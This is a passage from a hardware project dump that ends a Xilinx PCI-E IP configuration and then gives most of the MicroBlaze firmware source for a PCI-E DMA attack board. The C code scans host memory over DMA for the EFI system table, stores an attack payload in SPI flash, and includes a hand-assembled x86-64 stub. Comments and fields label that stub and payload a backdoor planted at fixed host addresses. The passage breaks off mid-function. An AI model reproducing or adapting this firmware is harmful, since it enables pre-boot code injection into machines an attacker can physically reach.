        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.cfg_fc_if">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.cfg_mgmt_if">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.cfg_status_if">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_ext_ch_gt_drp">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_ext_clk">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_ext_gt_common">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_ext_pipe_interface">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_ext_startup">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.en_transceiver_status_ports">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.enable_jtag_dbg">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.err_reporting_if">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.mode_selection">Advanced</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.pipe_mode_sim">None</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.pipe_sim">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.pl_interface">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.rcv_msg_if">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.shared_logic_in_core">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.ARCHITECTURE">artix7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BASE_BOARD_PART"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BOARD_CONNECTIONS"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.DEVICE">xc7a50t</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PACKAGE">csg325</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PREFHDL">VERILOG</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SILICON_REVISION"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SIMULATOR_LANGUAGE">MIXED</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SPEEDGRADE">-2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.STATIC_POWER"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.TEMPERATURE_GRADE"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_CUSTOMIZATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_GENERATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPCONTEXT">IP_Flow</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPREVISION">11</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.MANAGED">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.OUTPUTDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SELECTEDSIMMODEL"/>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SHAREDDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SWVERSION">2019.2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SYNTHESISFLOW">OUT_OF_CONTEXT</spirit:configurableElementValue>
      </spirit:configurableElementValues>
      <spirit:vendorExtensions>
        <xilinx:componentInstanceExtensions>
          <xilinx:configElementInfos>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TKEEP" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TLAST" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TREADY" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.HAS_TSTRB" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TDEST_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TID_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS_RX.TUSER_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TKEEP" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TLAST" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TREADY" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.HAS_TSTRB" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TDEST_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TID_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS_TX.TUSER_WIDTH" xilinx:valueSource="constant"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Base_Class_Menu" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Class_Code_Base" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Class_Code_Sub" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Device_ID" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Max_Payload_Size" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.PCI_CFG_Space" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.PCI_CFG_Space_Addr" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.PCIe_Blk_Locn" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Perf_Level" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.Sub_Class_Interface_Menu" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.User_Clk_Freq" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.mode_selection" xilinx:valueSource="user"/>
          </xilinx:configElementInfos>
        </xilinx:componentInstanceExtensions>
      </spirit:vendorExtensions>
    </spirit:componentInstance>
  </spirit:componentInstances>
</spirit:design>

```

`software/application/application.prj`:

```prj
<?xml version="1.0" encoding="ASCII"?>
<sdkproject:SdkProject xmi:version="2.0" xmlns:xmi="http://www.omg.org/XMI" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:sdkproject="http://www.xilinx.com/sdkproject" name="application" location="/home/user/Documents/Vivado/7x_pcie_microblaze/software/application" platform="/home/user/Documents/Vivado/7x_pcie_microblaze/software/7x_pcie_microblaze/export/7x_pcie_microblaze/7x_pcie_microblaze.xpfm" platformUID="xilinx:::0.0(custom)" systemProject="application_system" sysConfig="7x_pcie_microblaze" runtime="cpp" cpu="standalone_domain" cpuInstance="microblaze_0" os="standalone" mssSignature="e12011d0002edf7ba91b8e544d2064f6">
  <configuration name="Debug" id="xilinx.gnu.mb.exe.debug.824930021">
    <configBuildOptions xsi:type="sdkproject:SdkOptions"/>
    <lastBuildOptions xsi:type="sdkproject:SdkOptions"/>
  </configuration>
  <configuration name="Release" id="xilinx.gnu.mb.exe.release.1057807296">
    <configBuildOptions xsi:type="sdkproject:SdkOptions"/>
    <lastBuildOptions xsi:type="sdkproject:SdkOptions"/>
  </configuration>
  <template appTemplateName="hello_world"/>
</sdkproject:SdkProject>

```

`software/application/src/application.c`:

```c
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <fsl.h>

#include <xil_printf.h>
#include <xil_types.h>
#include <xparameters.h>
#include <xuartlite.h>
#include <xgpio.h>

#include "platform.h"
#include "platform_config.h"
#include "pcie_tlp.h"
#include "axi_dma.h"
#include "axis_pcie.h"
#include "protocol.h"
#include "flash.h"
#include "common.h"
#include "efi.h"
#include "efi_image.h"

// GPIO channel numbers
#define GPIO_CH_READ   1
#define GPIO_CH_WRITE  2

// read GPIO bit
#define GPIO_BIT_GET(_b_) (gpio_read() & (_b_))

// set GPIO bit
#define GPIO_BIT_OFF(_b_) gpio_write((gpio_read() & ~(_b_)))
#define GPIO_BIT_ON(_b_)  gpio_write((gpio_read() | (_b_)))

// obtain PCI-E device ID
#define GPIO_DEV_ID 0xffff
#define GPIO_DEV_ID_GET() GPIO_BIT_GET(GPIO_DEV_ID)

// obtain user button status
#define GPIO_BTN 0x10000
#define GPIO_BTN_GET() GPIO_BIT_GET(GPIO_BTN)

// control LED
#define GPIO_LED 1
#define GPIO_LED_OFF() GPIO_BIT_OFF(GPIO_LED)
#define GPIO_LED_ON() GPIO_BIT_ON(GPIO_LED)

/*
    Minimum and maximum address of EFI_SYSTEM_TABLE
*/
#define EFI_MIN_ADDR    0x010000000
#define EFI_MAX_ADDR    0x100000000

#define EFI_IS_ADDR_VALID(_addr_) ((_addr_) > EFI_MIN_ADDR && \
                                   (_addr_) < EFI_MAX_ADDR && (_addr_) % sizeof(u32) == 0)

/*
    System memory address range to scan for EFI_SYSTEM_TABLE
*/
#define EFI_SCAN_START  0xe0000000
#define EFI_SCAN_END    0x70000000
#define EFI_SCAN_STEP   (0x10 * PAGE_SIZE)

/*
    EFI_SYSTEM_TABLE header signature
*/
#define EFI_ST_SIGNATURE_1  0x20494249 // "IBI "
#define EFI_ST_SIGNATURE_2  0x54535953 // "SYST"

// name of the PE image section where PAYLOAD_CONF structure is located
#define PAYLOAD_CONF_NAME ".conf"

// address of the host physical memory to plant payload image
#define PAYLOAD_ADDR 0xc0000

// address of the host physical memory to plant payload stub
#define STUB_CODE_ADDR 0x10010
#define STUB_FUNC_ADDR 0x10000

#define DELAY_WAIT 1000000

struct PAYLOAD_CONF
{
    u64 backdoor_entry;
    u64 locate_protocol;
    u64 system_table;
};

struct SCAN_CONF
{
    u64 reserved;
    u64 signature;
    u64 addr_start;
    u64 addr_end;
    u64 step;
};

// used to override default EFI_SYSTEM_TABLE scan settings
#define SCAN_CONF_SIGN 0x524444414e414353

#define SCAN_CONF_IS_VALID(_addr_) ((_addr_) >= PAGE_SIZE && \
                                    (_addr_) < EFI_MAX_ADDR && (_addr_) % PAGE_SIZE == 0)

// GPIO device instance
static XGpio m_Gpio;

// UART device instance
static XUartLite m_Uart;

/*
    This stub is used to pass execution to the payload.
    It spins in the loop while DMA attack code is planting payload
    image at PAYLOAD_ADDR (it might take some time) and writing
    its entry point address at STUB_FUNC_ADDR.
*/
static u8 m_stub[] =
{
    0x48, 0xc7, 0xc0, 0x00, 0x00, 0x01, 0x00,   // mov      rax, STUB_FUNC_ADDR
    0x0f, 0xae, 0x38,                           // clflush  [rax]
    0x48, 0x8b, 0x00,                           // mov      rax, [rax]
    0x48, 0x85, 0xc0,                           // test     rax, rax
    0x74, 0xee,                                 // jz       STUB_CODE_ADDR
    0xff, 0xe0                                  // jmp      rax 
};

u32 m_dev_id = 0;

static inline int init_gpio(u32 device_id)
{
    if (XGpio_Initialize(&m_Gpio, device_id) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    // set input channel direction
    XGpio_SetDataDirection(&m_Gpio, GPIO_CH_READ, 0xffffffff);

    // set output channel direction
    XGpio_SetDataDirection(&m_Gpio, GPIO_CH_WRITE, 0x00000000);

    return XST_SUCCESS;
}

static inline u32 gpio_read(void)
{
    return XGpio_DiscreteRead(&m_Gpio, GPIO_CH_READ);
}

static inline void gpio_write(u32 mask)
{
    XGpio_DiscreteWrite(&m_Gpio, GPIO_CH_WRITE, mask);
}

static inline int init_uart(u32 device_id)
{
    return XUartLite_Initialize(&m_Uart, device_id);
}

static inline void uart_read(u8 *buff, u32 size)
{
    u32 count = 0;

    while (count < size)
    {
        // read needed amount of bytes
        count += XUartLite_Recv(&m_Uart, buff + count, size - count);
    }
}

static inline void uart_write(u8 *buff, u32 size)
{
    u32 count = 0;

    while (count < size)
    {
        // write needed amount of bytes
        count += XUartLite_Send(&m_Uart, buff + count, size - count);
    }
}

static void mode_serial(void)
{
    bool reset = false;
    u8 buff_rx[sizeof(PROT_CTL) + PROT_MAX_PACKET_SIZE];
    u8 buff_tx[sizeof(PROT_CTL) + PROT_MAX_PACKET_SIZE];

    PROT_CTL *request = (PROT_CTL *)&buff_rx;
    PROT_CTL *reply = (PROT_CTL *)&buff_tx;

    while (!reset)
    {
        bool ignore = false;

        reply->code = PROT_CTL_ERROR_FAILED;
        reply->size = 0;

        // receive request
        uart_read((u8 *)request, sizeof(PROT_CTL));

        if (request->size != 0)
        {
            // receive request data
            uart_read(request->data, (u32)request->size);
        }

        // dispatch client request
        switch (request->code)
        {
        case PROT_CTL_PING:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_PING\n");
#endif
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

        case PROT_CTL_RESET:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESET\n");
#endif
                // exit from serial mode
                reset = true;

                reply->code = PROT_CTL_SUCCESS;
                return;
            }

        case PROT_CTL_STATUS:
            {
                u32 device_status = GPIO_DEV_ID_GET();

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_STATUS\n");
#endif
                memcpy(reply->data, &device_status, sizeof(u32));

                reply->size = sizeof(u32);
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

        case PROT_CTL_TLP_SEND:
            {
                u32 size = (u32)request->size;

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_TLP_SEND\n");
#endif
                // send TLP
                int status = tlp_send(request->data, size);
                if (status == XST_SUCCESS)
                {
                    // success
                    reply->code = PROT_CTL_SUCCESS;
                }

                break;
            }

        case PROT_CTL_TLP_RECV:
            {
                u32 size = 0;

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_TLP_RECV\n");
#endif
                // receive TLP
                int status = tlp_recv(reply->data, &size);
                if (status == XST_SUCCESS)
                {
                    // success
                    reply->size = (u8)size;
                    reply->code = PROT_CTL_TLP_RECV;
                }
                else if (status == XST_TIMEOUT)
                {
                    // timeout occurred
                    reply->code = PROT_CTL_ERROR_TIMEOUT;
                }                

                break;
            }

        case PROT_CTL_CONFIG:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_CONFIG\n");
#endif
                if (GPIO_DEV_ID_GET() != 0)
                {
                    u32 cfg_addr = 0, cfg_data = 0;

                    memcpy(&cfg_addr, request->data, sizeof(u32));

                    // read PCI-E config space
                    cfg_data = axis_pcie_read_config(cfg_addr);

                    memcpy(reply->data, &cfg_data, sizeof(u32));

                    reply->size = sizeof(u32);
                    reply->code = PROT_CTL_SUCCESS;
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback(): PROT_CTL_CONFIG fails, device is not initialized\n");
#endif
                }

                break;
            }

        case PROT_CTL_TEST:
            {
                if (request->size < PROT_MAX_PACKET_SIZE)
                {
                    reply->size = request->size;
                    reply->code = PROT_CTL_SUCCESS;
                }

                break;
            }

#ifdef USE_ROM

        case PROT_CTL_RESIDENT_ON:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESIDENT_ON\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_RESIDENT_OFF:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_RESIDENT_OFF\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_BIT_WRITE:
            {
                PROT_CTL_ROM *rom_write = (PROT_CTL_ROM *)&request->data;

                if (request->size > sizeof(PROT_CTL_ROM))
                {
                    request->size -= sizeof(PROT_CTL_ROM);
                }
#ifdef VERBOSE
                xil_printf(
                    "recv_callback(): PROT_CTL_BIT_WRITE: offset = 0x%x, size = 0x%x\n",
                    rom_write->offset, request->size
                );
#endif
                if (rom_write->offset + request->size < BIT_SPI_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) == XST_SUCCESS)
                    {
                        // write bitstream contents into the flash
                        if (spi_flash_write(BIT_SPI_ADDR + rom_write->offset, 
                                            rom_write->data, request->size) == XST_SUCCESS)
                        {
                            reply->code = PROT_CTL_SUCCESS;
                        }
                    }
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback() ERROR: Bad bitstream offset\n");       
#endif
                }

                break;
            }

         case PROT_CTL_BIT_ERASE:
            {
                u32 ptr = 0;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_BIT_ERASE\n");
#endif
                reply->code = PROT_CTL_SUCCESS;

                for (ptr = 0; ptr < BIT_SPI_SIZE; ptr += FLASH_BLOCK_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }

                    // erasse single block
                    if (spi_flash_block_erase(BIT_SPI_ADDR + ptr) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }
                }

                break;
            }

        case PROT_CTL_ROM_WRITE:
            {
                PROT_CTL_ROM *rom_write = (PROT_CTL_ROM *)&request->data;

                if (request->size > sizeof(PROT_CTL_ROM))
                {
                    request->size -= sizeof(PROT_CTL_ROM);
                }
#ifdef VERBOSE
                xil_printf(
                    "recv_callback(): PROT_CTL_ROM_WRITE: offset = 0x%x, size = 0x%x\n",
                    rom_write->offset, request->size
                );
#endif
                if (rom_write->offset + request->size < ROM_SPI_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) == XST_SUCCESS)
                    {
                        // write option ROM contents into the flash
                        if (spi_flash_write(ROM_SPI_ADDR + rom_write->offset, 
                                            rom_write->data, request->size) == XST_SUCCESS)
                        {
                            reply->code = PROT_CTL_SUCCESS;
                        }
                    }
                }
                else
                {
#ifdef VERBOSE
                    xil_printf("recv_callback() ERROR: Bad option ROM offset\n");       
#endif
                }

                break;
            }

        case PROT_CTL_ROM_ERASE:
            {
                u32 ptr = 0;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_ERASE\n");
#endif
                reply->code = PROT_CTL_SUCCESS;

                for (ptr = 0; ptr < ROM_SPI_SIZE; ptr += FLASH_BLOCK_SIZE)
                {
                    // enable SPI flash write access
                    if (spi_flash_write_enable(COMMAND_WRITE_ENABLE) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }

                    // erasse single block
                    if (spi_flash_block_erase(ROM_SPI_ADDR + ptr) != XST_SUCCESS)
                    {
                        reply->code = PROT_CTL_ERROR_FAILED;
                        break;
                    }
                }

                break;
            }

        case PROT_CTL_ROM_LOG_ON:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_LOG_ON\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_ROM_LOG_OFF:
            {

#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_LOG_OFF\n");
#endif
                // not implemented

                // don't send any reply
                ignore = true;
                break;
            }

        case PROT_CTL_ROM_SIZE:
            {
                u32 rom_size = ROM_SPI_SIZE;
#ifdef VERBOSE
                xil_printf("recv_callback(): PROT_CTL_ROM_SIZE\n");
#endif
                memcpy(reply->data, &rom_size, sizeof(u32));

                reply->size = sizeof(u32);
                reply->code = PROT_CTL_SUCCESS;
                break;
            }

#endif // USE_ROM

        default:
            {

#ifdef VERBOSE
                xil_printf("recv_callback() ERROR: Unknown code\n");
#endif
                break;
            }
        }

        if (!ignore)
        {
            // send reply to the client
            uart_write((u8 *)reply, sizeof(PROT_CTL) + reply->size);
        }
    }
}

static void delay(void)
{
    for (u32 i = 0; i < DELAY_WAIT; i += 1)
    {
        // ...
    }
}

static int scan_image(u64 addr, u64 *system_table)
{
    struct dos_header dos_hdr;
    struct pe64_nt_headers nt_hdr;    

    // read DOS header
    if (mem_read(addr, (u8 *)&dos_hdr, sizeof(dos_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (dos_hdr.e_lfanew > PAGE_SIZE)
    {
        return XST_FAILURE;
    }

    // read NT headers
    if (mem_read(addr + dos_hdr.e_lfanew, (u8 *)&nt_hdr, sizeof(nt_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (nt_hdr.signature != PE_SIGNATURE)
    {
        return XST_FAILURE;   
    }    

    // verify machine and subsystem
    if (nt_hdr.file_header.machine != PE32_MACHINE_X86_64 || 
        (nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_APPLICATION &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_RUNTIME_DRIVER &&
         nt_hdr.optional_header.subsystem != SUBSYSTEM_EFI_ROM))
    {
        return XST_FAILURE;
    }

    xil_printf("EFI image is at 0x%llx\n", addr);

    // scan image contents
    for (u32 ptr = nt_hdr.optional_header.header_size; 
             ptr < nt_hdr.optional_header.image_size; ptr += sizeof(u64))
    {
        u64 val = 0;
        u32 sig = 0;

        // read single pointer from the image
        if (mem_read(addr + ptr, (u8 *)&val, sizeof(val)) != XST_SUCCESS)
        {            
            continue;
        }
        
        // check for the sane pointer value
        if (!EFI_IS_ADDR_VALID(val))
        {
            continue;
        }

        if (mem_read(val, (u8 *)&sig, sizeof(sig)) == XST_SUCCESS)
        {       
            // check for the first half of EFI_SYSTEM_TABLE signature
            if (sig == EFI_ST_SIGNATURE_1)
            {
                if (mem_read(val + sizeof(u32), (u8 *)&sig, sizeof(sig)) == XST_SUCCESS)
                {       
                    // check for the second half of EFI_SYSTEM_TABLE signature
                    if (sig == EFI_ST_SIGNATURE_2)
                    {
                        // found
                        *system_table = val;
                        
                        return XST_SUCCESS;
                    }
                }
            }
        }
    }

    return XST_FAILURE;
}

static int scan_memory(u64 addr_start, u64 addr_end, u64 step, u64 *system_table)
{
    xil_printf("scan_memory(): start = 0x%llx\n", addr_start);
    xil_printf("scan_memory():   end = 0x%llx\n", addr_end);
    xil_printf("scan_memory():  step = 0x%llx\n", step);

    // scan memory range
    for (u64 addr = addr_start; addr > addr_end; addr -= step)
    {
        u32 val = 0;

        if (mem_read(addr, (u8 *)&val, sizeof(val)) == XST_SUCCESS)
        {            
            // check for the DOS header signature
            if (val == DOS_SIGNATURE)
            {
                // scan PE image
                if (scan_image(addr, system_table) == XST_SUCCESS)
                {
                    return XST_SUCCESS;
                }
            }
        }
    }

    return XST_FAILURE;
}

static int rom_read(u32 addr, u8 *buff, u32 size)
{
    u32 ptr = 0;

    while (ptr < size)
    {
        // read single flash page
        if (spi_flash_read(
            ROM_SPI_ADDR + addr + ptr, buff + ptr, 
            MIN(FLASH_PAGE_SIZE, size - ptr), COMMAND_RANDOM_READ) != XST_SUCCESS)
        {
            xil_printf("ERROR: spi_flash_read() fails\n");

            return XST_FAILURE;
        }

        ptr += FLASH_PAGE_SIZE;
    }

    return XST_SUCCESS;
}

static int rom_info(u64 *image_base, u32 *image_size, u32 *image_conf)
{
    struct dos_header dos_hdr;
    struct pe64_nt_headers nt_hdr;    

    // read DOS header
    if (rom_read(0, (u8 *)&dos_hdr, sizeof(dos_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (dos_hdr.e_magic != DOS_SIGNATURE)
    {
        xil_printf("ERROR: bad payload DOS signature\n");
        return XST_FAILURE;
    }

    // read NT headers
    if (rom_read(dos_hdr.e_lfanew, (u8 *)&nt_hdr, sizeof(nt_hdr)) != XST_SUCCESS)
    {
        return XST_FAILURE;
    }

    if (nt_hdr.signature != PE_SIGNATURE)
    {
        xil_printf("ERROR: bad payload NT signature\n");
        return XST_FAILURE;
    }

    xil_printf("Image size is 0x%lx\n", nt_hdr.optional_header.image_size);

    if (nt_hdr.optional_header.section_alignment != 
        nt_hdr.optional_header.file_alignment)
    {
        xil_printf("ERROR: bad payload alignment\n");
        return XST_FAILURE;
    }

    u32 sec_addr = dos_hdr.e_lfanew + 
        OFFSET_OF(struct pe64_nt_headers, optional_header) + 
        nt_hdr.file_header.optional_header_size;

    // enumerate section
    for (u16 i = 0; i < nt_hdr.file_header.num_sections; i += 1)
    {
        struct pe32_section_header sec_hdr;

        // read section header
        if (rom_read(sec_addr, (u8 *)&sec_hdr, sizeof(sec_hdr)) != XST_SUCCESS)
        {
            return XST_FAILURE;
        }

        xil_printf(
            "Section #%d addr = 0x%x, size = 0x%x\n", 
            i, sec_hdr.virtual_address, sec_hdr.virtual_size
        );

        if (!strcmp(sec_hdr.name, PAYLOAD_CONF_NAME))
        {
            *image_conf = sec_hdr.virtual_address;
        }

        *image_size = sec_hdr.raw_data_offset + sec_hdr.raw_data_size;

        sec_addr += sizeof(struct pe32_section_header);
    }

    *image_base = nt_hdr.optional_header.image_base;

    return XST_SUCCESS;
}

static void mode_standalone(void)
{
    u64 image_base = 0;
    u32 image_size = 0, image_conf = 0;
    u64 scan_start = EFI_SCAN_START, scan_end = EFI_SCAN_END, scan_step = EFI_SCAN_STEP;
    struct SCAN_CONF scan_conf;

    xil_printf("mode_standalone(): Starting attack...\n");

    // get information about payload
    if (rom_info(&image_base, &image_size, &image_conf) != XST_SUCCESS)
    {
        xil_printf("Payload is not present\n");  
        return;
    }

    if (image_conf == 0)
    {
        xil_printf("Payload config is not found\n");
        return;   
    }

    xil_printf("Payload size is %d bytes\n", image_size);
    xil_printf("Payload config RVA is 0x%x\n", image_conf);

    // read SCAN_CONF structure from the DOS header of payload image
    if (rom_read(0, (u8 *)&scan_conf, sizeof(scan_conf)) != XST_SUCCESS)
    {
        xil_printf("ERROR: rom_read() fails\n");
        return;
    }

    // check for SCAN_CONF present
    if (scan_conf.signature == SCAN_CONF_SIGN)
    {
        // sanity check start and end address
        if (SCAN_CONF_IS_VALID(scan_conf.addr_start) &&
            SCAN_CONF_IS_VALID(scan_conf.addr_end) && scan_conf.addr_start > scan_conf.addr_end)
        {
            xil_printf("Overriding default scan_start value\n");
            xil_printf("Overriding default scan_end value\n");

            scan_start = scan_conf.addr_start;
            scan_end = scan_conf.addr_end;

            // sanity check scan step
            if (SCAN_CONF_IS_VALID(scan_conf.step))
            {
                xil_printf("Overriding default scan_step value\n");

                scan_step = scan_conf.step;
            }
        }
        else
        {
            xil_printf("SCAN_CONF is invalid\n");
        }
    }
    else
    {
        xil_printf("SCAN_CONF is not present\n");
    }

    xil_printf("Waiting for PCI-E endpoint to be ready...\n");

    while ((m_dev_id = GPIO_DEV_ID_GET()) == 0)
    {
        // wait for the endpoint to be intinialized
        delay();
    }

    u32 val = 0;

    while (mem_read(0, (u8 *)&val, sizeof(val)) == XST_FAILURE)
    {        
        // wait for the root complex to be ready to accept memory access requests
        delay();

        m_dev_id = GPIO_DEV_ID_GET();
    }

    xil_printf(
        "dev_id = %d:%d.%d\n",
        (u32)((m_dev_id >> 8) & 0xff), (u32)((m_dev_id >> 3) & 0x1f), 
        (u32)((m_dev_id >> 0) & 0x07)
    );

    u64 system_table = 0, boot_services = 0, locate_protocol = 0;
    u64 stub_addr = STUB_CODE_ADDR, stub_zero = 0;

    xil_printf("Starting memory scan...\n");

    // scan system memory to find EFI_SYSTEM_TABLE
    if (scan_memory(scan_start, scan_end, scan_step, &system_table) != XST_SUCCESS)
    {
        xil_printf("Unable to find EFI_SYSTEM_TABLE\n");   
        return;
    }

    xil_printf("EFI_SYSTEM_TABLE is at 0x%llx\n", system_table);

    if (mem_read(
        system_table + OFFSET_OF(struct efi_system_table, boot_services),
